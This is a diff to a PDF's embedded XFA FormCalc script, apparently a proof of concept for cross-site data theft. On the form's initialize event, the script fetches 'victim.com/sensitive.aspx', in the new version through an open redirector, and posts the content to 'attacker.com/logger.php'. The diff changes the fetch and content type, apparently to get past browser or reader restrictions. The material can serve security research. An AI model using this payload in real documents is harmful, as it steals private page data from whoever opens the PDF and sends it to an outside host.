@@ -15,8 +15,8 @@ stream
             <event activity="initialize">
 			<script contentType='application/x-formcalc'>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Change This Section;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
-					var content = Get("http://victim.com/sensitive.aspx"); // PDF reads this page
-					Post("http://attacker.com/logger.php",content, "application/x-www-form-urlencoded", "utf-8", "Referer: http://www.victim.com/"); // Attacker hijacks the data
+					var content = Get("http://0me.me/redirect.php?rdir=http://victim.com/sensitive.aspx&amp;//"); // PDF reads this page
+					Post("http://attacker.com/logger.php",content, "text/plain", "utf-8", "referer: http://www.victim.com/"); // Attacker hijacks the data
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;				
                 </script>	
             </event>
